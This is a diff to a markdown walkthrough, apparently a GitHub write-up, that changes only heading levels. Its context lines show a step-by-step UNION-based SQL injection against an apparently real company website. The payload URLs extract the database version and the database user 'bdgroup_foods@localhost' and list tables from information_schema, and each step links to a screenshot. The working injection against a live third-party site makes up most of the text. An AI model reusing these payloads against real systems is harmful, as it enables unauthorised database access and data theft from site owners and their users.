@@ -32,13 +32,13 @@ url: https://bdfoods.com.bd/awards.php?id=9%20union%20select%201,%202,%203%20,%2
 url : https://bdfoods.com.bd/awards.php?id=9%20union%20select%201,%202,%20version()%20,%204
 <img width="959" height="1049" alt="image" src="https://github.com/user-attachments/assets/0ac1ce64-73b6-44ee-bcb7-82833c5d8367" />
 
-###### Step 05 : username
+##### Step 05 : username
 bdgroup_foods@localhost 
 
 url: https://bdfoods.com.bd/awards.php?id=9%20union%20select%201,%202,user(),%204
 <img width="959" height="1049" alt="image" src="https://github.com/user-attachments/assets/1bd29345-5235-470f-9e65-662d7518392a" />
 
-###### Step 06 : database list of tables
+##### Step 06 : database list of tables
 
 url : https://bdfoods.com.bd/awards.php?id=9%20union%20select%201,%202,table_name,%204%20from%20information_schema.tables
 <img width="959" height="1049" alt="image" src="https://github.com/user-attachments/assets/c90efc64-eff3-4d16-aaaa-03cc8c93330f" />
